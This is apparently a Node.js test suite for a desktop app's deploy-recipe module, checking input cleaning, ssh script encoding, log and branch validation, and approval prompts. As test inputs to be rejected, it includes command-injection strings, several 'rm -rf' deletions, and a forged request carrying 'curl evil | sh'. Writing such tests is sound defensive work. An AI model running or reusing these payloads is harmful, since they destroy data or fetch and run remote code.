const assert = require('node:assert/strict');
const { spawnSync } = require('node:child_process');
const { existsSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } = require('node:fs');
const { tmpdir } = require('node:os');
const { basename, dirname, join } = require('node:path');
const { test } = require('node:test');
const deploy = require('../computer-deploy.cjs');
const { promptFits } = require('../computer-approval.cjs');

const NONCE = '0123456789abcdef';
const SHA = 'a'.repeat(40);
const PAIRED = 'computer_0001';
const hasSh = process.platform !== 'win32' && existsSync('/bin/sh');

function dataFolder(t) {
  const parent = realpathSync(tmpdir());
  const dir = mkdtempSync(join(parent, '1904-computer-deploy-test-'));
  t.after(() => {
    const target = realpathSync(dir);
    assert.equal(dirname(target), parent);
    assert.match(basename(target), /^1904-computer-deploy-test-/);
    rmSync(target, { recursive: true });
  });
  return dir;
}

const recipe = (overrides = {}) => {
  const checked = deploy.cleanRecipe({ connect: 'ssh deploy@host', commands: 'cd /srv/app\ngit pull --ff-only\nnpm run build', ...overrides });
  assert.equal(checked.ok, true, checked.error);
  return checked.recipe;
};

/** Runs the script the way the host would: decoded from the one quoted word, by sh. */
function runAsHost(plan) {
  const word = /'(echo [A-Za-z0-9+/=]+ \| base64 -d \| sh)'$/.exec(plan.command);
  assert.ok(word, 'the script travels as one single-quoted word of base64');
  const result = spawnSync('/bin/sh', ['-c', word[1]], { encoding: 'utf8' });
  return { status: 'done', exitCode: result.status, stdout: result.stdout, stderr: result.stderr };
}

test('a recipe is cleaned, bounded and defaults to asking', () => {
  const checked = deploy.cleanRecipe({ connect: '  ssh deploy@host  ', commands: '\r\ncd /srv/app  \r\ngit pull\r\n\r\n' });
  assert.deepEqual(checked.recipe, {
    connect: 'ssh deploy@host', commands: 'cd /srv/app\ngit pull', log: { mode: 'output', path: '' },
    auto: true, noApproval: false, position: 10, stopOnFailure: false,
  });
  assert.equal(deploy.cleanRecipe({ commands: '   ' }).ok, false);
  assert.equal(deploy.cleanRecipe({ connect: 'ssh a\nrm -rf /', commands: 'true' }).ok, false);
  assert.equal(deploy.cleanRecipe({ connect: 'ssh host \\', commands: 'true' }).ok, false);
  assert.equal(deploy.cleanRecipe({ commands: 'x'.repeat(deploy.DEPLOY_COMMANDS_MAX + 1) }).ok, false);
  assert.equal(deploy.cleanRecipe({ commands: Array(deploy.DEPLOY_COMMAND_LINES + 1).fill('true').join('\n') }).ok, false);
  assert.equal(deploy.cleanRecipe({ commands: 'true\u0000' }).ok, false);
  assert.equal(deploy.cleanRecipe({ commands: 'true', position: 500 }).recipe.position, 99);
  assert.equal(deploy.cleanRecipe({ commands: 'true', noApproval: 'yes' }).recipe.noApproval, false);
});

test('a log path can never carry shell syntax', () => {
  for (const path of ['/var/log/app/deploy.log', '~/deploy.log', '/srv/app-1/logs/deploy_2.log']) {
    assert.equal(deploy.cleanRecipe({ commands: 'true', log: { mode: 'write', path } }).ok, true, path);
  }
  for (const path of ['', 'deploy.log', '/tmp/a b.log', '/tmp/$(id).log', '/tmp/`id`.log', '/tmp/a";id;".log', "/tmp/a'.log", '/tmp/../etc/x', '/tmp/a\\b', '/tmp/a|b', '/tmp/a>b']) {
    assert.equal(deploy.cleanRecipe({ commands: 'true', log: { mode: 'write', path } }).ok, false, path);
  }
});

test('everything a recipe can hold fits one approval prompt', () => {
  const largest = recipe({
    connect: 'c'.repeat(deploy.DEPLOY_CONNECT_MAX),
    commands: Array(deploy.DEPLOY_COMMAND_LINES).fill('x'.repeat(Math.floor(deploy.DEPLOY_COMMANDS_MAX / deploy.DEPLOY_COMMAND_LINES) - 1)).join('\n'),
    log: { mode: 'write', path: '/' + 'p'.repeat(deploy.DEPLOY_LOG_PATH_MAX - 1) },
  });
  assert.equal(promptFits(deploy.recipeText(largest)), true);
});

test('the hash follows what runs and nothing else', () => {
  const base = recipe();
  assert.equal(deploy.recipeHash(base), deploy.recipeHash({ ...base, noApproval: true, position: 3, auto: false, stopOnFailure: true }));
  assert.notEqual(deploy.recipeHash(base), deploy.recipeHash({ ...base, commands: base.commands + '\ntrue' }));
  assert.notEqual(deploy.recipeHash(base), deploy.recipeHash({ ...base, connect: 'ssh other@host' }));
  assert.notEqual(deploy.recipeHash(base), deploy.recipeHash({ ...base, log: { mode: 'write', path: '/tmp/x.log' } }));
});

test('with a connect line the script is one quoted word of base64', () => {
  const nasty = recipe({ commands: `echo "it's $HOME" && printf '%s\\n' \`date\` | cat` });
  const plan = deploy.deployPlan({ recipe: nasty, platform: 'windows', sha: SHA, branch: 'main', nonce: NONCE });
  assert.equal(plan.marker, true);
  assert.equal(plan.shell, undefined);
  assert.match(plan.command, /^ssh deploy@host 'echo [A-Za-z0-9+/=]+ \| base64 -d \| sh'$/);
  const script = Buffer.from(/echo ([A-Za-z0-9+/=]+) /.exec(plan.command)[1], 'base64').toString('utf8');
  assert.ok(script.includes(nasty.commands));
  assert.ok(script.includes(`DEPLOY_SHA='${SHA}'`));
});

test('without one, macOS runs the script in sh and Windows runs the commands as written', () => {
  const local = recipe({ connect: '' });
  const mac = deploy.deployPlan({ recipe: local, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE });
  assert.deepEqual([mac.shell.file, mac.marker], ['/bin/sh', true]);
  assert.ok(mac.command.includes('set -e\n' + local.commands));
  assert.deepEqual(deploy.deployPlan({ recipe: local, platform: 'windows', sha: SHA, branch: 'main', nonce: NONCE }),
    { command: `${deploy.POWERSHELL_STOP}\n${local.commands}`, marker: false }, 'a failure stops the commands after it where PowerShell can');
});

test('a commit or branch 1904 sends cannot reach the script unless it is one', () => {
  const script = deploy.deployScript({ recipe: recipe(), sha: "'; rm -rf / #", branch: 'main; id', nonce: NONCE });
  assert.ok(script.includes("DEPLOY_SHA=''\n"));
  assert.ok(script.includes("DEPLOY_BRANCH=''\n"));
  assert.ok(!script.includes('rm -rf'));
  assert.deepEqual(deploy.deployEnvironment({ platform: 'macos', env: { SSH_AUTH_SOCK: '/tmp/agent.sock', SECRET: 'x' }, sha: SHA, branch: 'release/1.2' }),
    { DEPLOY_SHA: SHA, DEPLOY_BRANCH: 'release/1.2', SSH_AUTH_SOCK: '/tmp/agent.sock' });
  assert.deepEqual(deploy.deployEnvironment({ platform: 'windows', env: { SSH_AUTH_SOCK: '/tmp/agent.sock' }, sha: 'nope', branch: 'a b' }), { DEPLOY_SHA: '', DEPLOY_BRANCH: '' });
  assert.throws(() => deploy.deployScript({ recipe: recipe(), nonce: 'short' }));
});

test('the commands run in order, stop at the first failure and report their own exit status', { skip: !hasSh }, () => {
  const good = runAsHost(deploy.deployPlan({ recipe: recipe({ commands: 'echo one\necho "sha=$DEPLOY_SHA branch=$DEPLOY_BRANCH"\necho three' }), platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
  const passed = deploy.deployOutcome({ outcome: good, marker: true, nonce: NONCE });
  assert.deepEqual([passed.status, passed.exitCode, passed.confirmed], ['done', 0, true]);
  assert.equal(passed.output, `one\nsha=${SHA} branch=main\nthree\n`);

  const bad = runAsHost(deploy.deployPlan({ recipe: recipe({ commands: 'echo one\nfalse\necho never' }), platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
  const failed = deploy.deployOutcome({ outcome: bad, marker: true, nonce: NONCE });
  assert.deepEqual([failed.status, failed.exitCode, failed.confirmed], ['failed', 1, true]);
  assert.equal(failed.output, 'one\n');
  assert.match(failed.message, /exit code 1/);

  const coded = runAsHost(deploy.deployPlan({ recipe: recipe({ commands: 'exit 7' }), platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
  assert.equal(deploy.deployOutcome({ outcome: coded, marker: true, nonce: NONCE }).exitCode, 7);
});

test('a command that reads its input cannot swallow the rest of the script', { skip: !hasSh }, () => {
  const run = runAsHost(deploy.deployPlan({ recipe: recipe({ commands: 'cat\necho after' }), platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
  const outcome = deploy.deployOutcome({ outcome: run, marker: true, nonce: NONCE });
  assert.deepEqual([outcome.status, outcome.output], ['done', 'after\n']);
});

test('a command that does not parse runs nothing and is not counted as done', { skip: !hasSh }, () => {
  const run = runAsHost(deploy.deployPlan({ recipe: recipe({ commands: 'echo "unterminated' }), platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
  const outcome = deploy.deployOutcome({ outcome: run, marker: true, nonce: NONCE });
  assert.equal(outcome.status, 'failed');
  assert.equal(outcome.confirmed, false);
});

test('writing a log on the host keeps the commands’ result, and the end of the log comes back', { skip: !hasSh }, t => {
  const dir = dataFolder(t);
  const log = join(dir, 'deploy.log');
  writeFileSync(log, 'from an earlier deploy\n');
  const written = recipe({ commands: 'echo building\necho oops >&2\nexit 3', log: { mode: 'write', path: log } });
  const run = runAsHost(deploy.deployPlan({ recipe: written, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
  const outcome = deploy.deployOutcome({ outcome: run, marker: true, nonce: NONCE });
  assert.deepEqual([outcome.status, outcome.exitCode], ['failed', 3]);
  // Only this deploy's part of the log comes back; the file keeps everything.
  assert.equal(outcome.log, 'building\noops\n');
  assert.equal(readFileSync(log, 'utf8'), `from an earlier deploy\n== 1904 deploy ${SHA} ==\nbuilding\noops\n`);
  assert.equal(outcome.output, '');
});

test('a log that cannot be written never stops the commands', { skip: !hasSh }, t => {
  const dir = dataFolder(t);
  const unwritable = recipe({ commands: 'echo still ran', log: { mode: 'write', path: join(dir, 'missing-folder', 'deploy.log') } });
  const run = runAsHost(deploy.deployPlan({ recipe: unwritable, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
  const outcome = deploy.deployOutcome({ outcome: run, marker: true, nonce: NONCE });
  assert.deepEqual([outcome.status, outcome.exitCode], ['done', 0]);
  assert.equal(outcome.output, 'still ran\n');
  assert.match(run.stderr, /could not write to .*ran without a log file/);
});

test('a log the commands write themselves is read after them, and a missing one changes nothing', { skip: !hasSh }, t => {
  const dir = dataFolder(t);
  const log = join(dir, 'own.log');
  const own = recipe({ commands: `echo "built at $DEPLOY_SHA" > ${log}\necho visible`, log: { mode: 'file', path: log } });
  const outcome = deploy.deployOutcome({ outcome: runAsHost(deploy.deployPlan({ recipe: own, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE })), marker: true, nonce: NONCE });
  assert.deepEqual([outcome.status, outcome.output, outcome.log], ['done', 'visible\n', `built at ${SHA}\n`]);
  const missing = recipe({ commands: 'exit 4', log: { mode: 'file', path: join(dir, 'nope.log') } });
  const failed = deploy.deployOutcome({ outcome: runAsHost(deploy.deployPlan({ recipe: missing, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE })), marker: true, nonce: NONCE });
  assert.deepEqual([failed.status, failed.exitCode, failed.log], ['failed', 4, '']);
});

test('a log must be an ordinary file, and a disk that cannot take a line is found before the commands', { skip: !hasSh }, t => {
  const dir = dataFolder(t);
  for (const path of ['/dev/null', dir]) {
    const odd = recipe({ commands: 'echo ran', log: { mode: 'write', path } });
    const run = runAsHost(deploy.deployPlan({ recipe: odd, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE }));
    const outcome = deploy.deployOutcome({ outcome: run, marker: true, nonce: NONCE });
    assert.deepEqual([outcome.status, outcome.output], ['done', 'ran\n'], path);
    assert.match(run.stderr, /ran without a log file/);
  }
  if (existsSync('/dev/full')) {
    const full = recipe({ commands: 'echo ran', log: { mode: 'write', path: '/dev/full' } });
    const outcome = deploy.deployOutcome({ outcome: runAsHost(deploy.deployPlan({ recipe: full, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE })), marker: true, nonce: NONCE });
    assert.deepEqual([outcome.status, outcome.output], ['done', 'ran\n']);
  }
  // A device named as a log the commands write is never read: reading it would not end.
  const device = recipe({ commands: 'echo ran', log: { mode: 'file', path: '/dev/zero' } });
  const read = deploy.deployOutcome({ outcome: runAsHost(deploy.deployPlan({ recipe: device, platform: 'macos', sha: SHA, branch: 'main', nonce: NONCE })), marker: true, nonce: NONCE });
  assert.deepEqual([read.status, read.log], ['done', '']);
});

test('a branch that could be read as an option, or that git would refuse, arrives empty', () => {
  for (const branch of ['main', 'release/1.2', 'feature/add-login_2']) assert.equal(deploy.validBranch(branch), true, branch);
  for (const branch of ['--force', '-f', '/abs', '.hidden', 'a..b', 'a//b', 'a/.b', 'main.lock', 'x.lock/y', 'trailing/', 'dot.', 'a b', 'a;b', '']) assert.equal(deploy.validBranch(branch), false, branch);
  assert.ok(deploy.deployScript({ recipe: recipe(), sha: SHA, branch: '--force', nonce: NONCE }).includes("DEPLOY_BRANCH=''\n"));
});

test('commands that cannot be shown in full are refused when they are saved', () => {
  const hidden = deploy.cleanRecipe({ commands: 'echo ok' + '\u00ad'.repeat(400) });
  assert.equal(hidden.ok, false);
  assert.match(hidden.error, /too long to review in one prompt/);
});

test('output that never reports back is not a finished deploy', () => {
  const silent = deploy.deployOutcome({ outcome: { status: 'done', exitCode: 0, stdout: 'looks fine\n' }, marker: true, nonce: NONCE });
  assert.deepEqual([silent.status, silent.message], ['failed', deploy.UNCONFIRMED_RUN]);
  // Another run's report, or one printed mid-output, does not count.
  const forged = deploy.deployOutcome({ outcome: { status: 'done', exitCode: 0, stdout: `__1904_deploy_${'f'.repeat(16)}:0\n` }, marker: true, nonce: NONCE });
  assert.equal(forged.status, 'failed');
  // Something the commands left running may print after the report: the report still counts, and the rest is output.
  const late = deploy.deployOutcome({ outcome: { status: 'done', exitCode: 0, stdout: `ok\n__1904_deploy_${NONCE}:0\nlate\n` }, marker: true, nonce: NONCE });
  assert.deepEqual([late.status, late.output], ['done', 'ok\nlate\n']);
  // The connection ending badly after the commands reported 0 is a failure with the connection's code.
  const dropped = deploy.deployOutcome({ outcome: { status: 'done', exitCode: 255, stdout: `__1904_deploy_${NONCE}:0\n` }, marker: true, nonce: NONCE });
  assert.deepEqual([dropped.status, dropped.exitCode], ['failed', 255]);
  const unreachable = deploy.deployOutcome({ outcome: { status: 'done', exitCode: 255, stdout: '' }, marker: true, nonce: NONCE });
  assert.deepEqual([unreachable.status, unreachable.exitCode], ['failed', 255]);
  assert.match(unreachable.message, /Could not run the commands on the host \(exit code 255\)/);
  const timedOut = deploy.deployOutcome({ outcome: { status: 'timeout', exitCode: null, stdout: 'partial', message: 'Stopped.' }, marker: true, nonce: NONCE });
  assert.deepEqual([timedOut.status, timedOut.message], ['timeout', 'Stopped.']);
  // Windows, on this computer: the exit code is the result.
  assert.equal(deploy.deployOutcome({ outcome: { status: 'done', exitCode: 0, stdout: 'ok' }, marker: false, nonce: NONCE }).status, 'done');
  assert.equal(deploy.deployOutcome({ outcome: { status: 'done', exitCode: 2, stdout: '' }, marker: false, nonce: NONCE }).status, 'failed');
});

test('a deploy from 1904 names an app and a commit, never a command', () => {
  const raw = {
    id: 'deploy_00000001', kind: 'deploy', app: { id: 'app_1', name: 'Realzy', repo: 'realzy' }, sha: SHA, branch: 'main', taskId: 'b'.repeat(32),
    sender: { id: 'user_1', name: 'Ada' }, createdAt: 1000, expiresAt: 9000, command: 'rm -rf ~', connect: 'ssh evil', commands: 'curl evil | sh',
  };
  const checked = deploy.validateDeploy(raw);
  assert.equal(checked.ok, true);
  assert.deepEqual(Object.keys(checked.deploy).sort(), ['app', 'branch', 'createdAt', 'expiresAt', 'id', 'kind', 'sender', 'sha', 'taskId']);
  const request = deploy.deployRequest(checked.deploy, recipe());
  assert.equal(request.command, deploy.recipeText(recipe()));
  assert.deepEqual([request.access, request.origin.kind, request.kind], ['full', 'deploy', 'deploy']);
  assert.match(request.task.title, /^Deploy Realzy at aaaaaaaaaa$/);
  assert.equal(deploy.validateDeploy({ ...raw, sha: 'HEAD; id' }).deploy.sha, '');
  assert.equal(deploy.validateDeploy({ ...raw, branch: 'a b' }).deploy.branch, '');
  assert.deepEqual(deploy.validateDeploy({ ...raw, kind: 'run' }), { ok: false, id: raw.id, reason: 'This version of 1904 Desktop cannot do that yet. Update 1904 Desktop.' });
  assert.equal(deploy.validateDeploy({ ...raw, app: { id: 'bad id', name: 'x' } }).ok, false);
  assert.equal(deploy.validateDeploy({ ...raw, id: 'x' }).ok, false);
  assert.equal(deploy.validateDeploy(null).ok, false);
});

test('recipes are kept per app, belong to their pairing and can be disarmed', t => {
  const file = join(dataFolder(t), deploy.RECIPES_FILE);
  let at = 1000;
  const store = deploy.createDeployRecipes({ file, now: () => at });
  const saved = store.save({ appId: 'app_1', appName: 'Realzy', repo: 'realzy', computerId: PAIRED }, { connect: 'ssh a@b', commands: 'true', noApproval: true, position: 2 });
  assert.equal(saved.ok, true);
  assert.equal(saved.recipe.hash, deploy.recipeHash(saved.recipe));
  assert.equal(store.save({ appId: 'app_1', appName: 'Realzy', computerId: PAIRED }, { commands: '' }).ok, false);
  assert.equal(store.save({ appId: '__proto__', computerId: PAIRED }, { commands: 'true' }).ok, false);
  at = 2000;
  store.noteRun('app_1', { status: 'done', sha: SHA, exitCode: 0 });

  const reread = deploy.createDeployRecipes({ file });
  const recipeBack = reread.get('app_1', PAIRED);
  assert.deepEqual([recipeBack.noApproval, recipeBack.position, recipeBack.lastRun.status, recipeBack.lastRun.at], [true, 2, 'done', 2000]);
  // Another pairing: the text stays, but it does not run and never without asking.
  assert.equal(reread.get('app_1', 'computer_0002'), undefined);
  const view = deploy.recipeView(reread.all()[0], 'computer_0002');
  assert.deepEqual([view.stale, view.noApproval, view.commands], [true, false, 'true']);
  reread.disarm();
  assert.equal(deploy.createDeployRecipes({ file }).get('app_1', PAIRED).noApproval, false);
  assert.equal(reread.remove('app_1'), true);
  assert.deepEqual(deploy.createDeployRecipes({ file }).all(), []);
});

test('a recipe file someone else wrote is read with the same rules', t => {
  const file = join(dataFolder(t), deploy.RECIPES_FILE);
  writeFileSync(file, JSON.stringify({
    app_ok: { computerId: PAIRED, appName: 'Ok', commands: 'true', noApproval: true, hash: 'forged' },
    app_bad: { computerId: PAIRED, commands: 'true', log: { mode: 'write', path: '/tmp/$(id)' } },
    app_unpaired: { commands: 'true' },
  }));
  const store = deploy.createDeployRecipes({ file });
  assert.deepEqual(store.all().map(entry => entry.appId), ['app_ok']);
  assert.equal(store.get('app_ok', PAIRED).hash, deploy.recipeHash(store.get('app_ok', PAIRED)));
});

test('1904 is told when to ask and in what order, never the commands', () => {
  const registration = deploy.recipeRegistration({ appId: 'app_1', ...recipe({ log: { mode: 'file', path: '/var/log/x.log' } }), hash: 'h' });
  assert.deepEqual(registration, { action: 'save', appId: 'app_1', auto: true, noApproval: false, position: 10, stopOnFailure: false, remote: true, logMode: 'file', commandsHash: 'h' });
  const update = deploy.deployUpdate({ deployId: 'deploy_00000001', status: 'failed', exitCode: 3, output: 'o', stderr: 'e', log: 'l', durationMs: 12.6, message: 'm' });
  assert.deepEqual(update, { action: 'result', deployId: 'deploy_00000001', status: 'failed', exitCode: 3, output: 'o', stderr: 'e', log: 'l', durationMs: 13, message: 'm' });
  assert.throws(() => deploy.deployUpdate({ deployId: 'd', status: 'skipped' }));
});

test('turning approval off shows every command first and defaults to Cancel', () => {
  const prompt = deploy.noApprovalPrompt({ appName: 'Realzy', ...recipe() }, 'Studio PC');
  assert.deepEqual([prompt.defaultId, prompt.cancelId, prompt.buttons[0]], [0, 0, 'Cancel']);
  assert.match(prompt.message, /Realzy/);
  assert.ok(prompt.detail.includes('ssh deploy@host'));
  assert.ok(prompt.detail.includes('npm run build'));
});
